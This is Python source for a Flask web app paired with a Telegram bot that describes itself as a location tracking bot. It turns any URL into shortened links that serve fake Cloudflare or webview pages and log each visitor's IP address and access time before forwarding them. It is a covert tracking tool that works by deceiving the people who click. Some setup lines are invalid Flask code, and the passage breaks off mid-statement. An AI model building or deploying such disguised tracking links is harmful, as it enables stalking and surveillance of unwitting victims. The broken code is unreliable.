import os
import base64
from datetime import datetime
import json
from flask import Flask, request, render_template, redirect, jsonify
import requests
import telegram
from telegram import InlineKeyboardButton, InlineKeyboardMarkup

app = Flask(__name__)
json_parser = app.json_parser = Flask.json_decoder_class(app)

url_encoded_parser = app.url_encoded_parser = Flask.url_decoder_class(app)
app.config['MAX_CONTENT_LENGTH'] = 1024 * 1024 * 20

# Modify your URL here
hostURL = "urlhost"

# TOGGLE for Shorters
use1pt = True

# Replace process.env["bot"] with your Telegram Bot Token
bot = telegram.Bot(token=os.environ.get('bot'))
@app.route('/')
def index():
    return 'Welcome to the location tracking bot!'

@app.route('/w/<path:path>/<uri>')
def w(path, uri):
    ip = request.remote_addr
    d = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    if path is not None:
        url = base64.b64decode(uri).decode('utf-8')
        return render_template("webview.html", ip=ip, time=d, url=url, uid=path, a=hostURL, t=use1pt)
    else:
        return redirect("https://t.me/th30neand0nly0ne")

@app.route('/c/<path:path>/<uri>')
def c(path, uri):
    ip = request.remote_addr
    d = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    if path is not None:
        url = base64.b64decode(uri).decode('utf-8')
        return render_template("cloudflare.html", ip=ip, time=d, url=url, uid=path, a=hostURL, t=use1pt)
    else:
        return redirect("https://t.me/th30neand0nly0ne")


def create_link(cid, msg):
    if ("http" in msg.lower() or "https" in msg.lower()) and not any(ord(char) > 127 for char in msg):
        url = str(cid) + '/' + base64.b64encode(msg.encode('utf-8')).decode('utf-8')
        m = InlineKeyboardMarkup([[InlineKeyboardButton("Create new Link", callback_data="crenew")]])

        cUrl = f"{hostURL}/c/{url}"
        wUrl = f"{hostURL}/w/{url}"

        bot.send_chat_action(chat_id=cid, action=telegram.ChatAction.TYPING)

        if use1pt:
            x = requests.get(f"https://short-link-api.vercel.app/?query={cUrl}").json()
            y = requests.get(f"https://short-link-api.vercel.app/?query={wUrl}").json()

            f = ''.join(str(c) for c in x)
            g = ''.join(str(c) for c in y)

            bot.send_message(cid, f"New links has been created successfully. You can use any one of the below links. URL: {msg}.\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n{f}\n\n🔗Webview Page Link\n{g}\n\n", reply_markup=m)
        else:
            bot.send_message(cid, f"New link has been created successfully. You can use any one of the below links. URL: {msg}.\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n{c
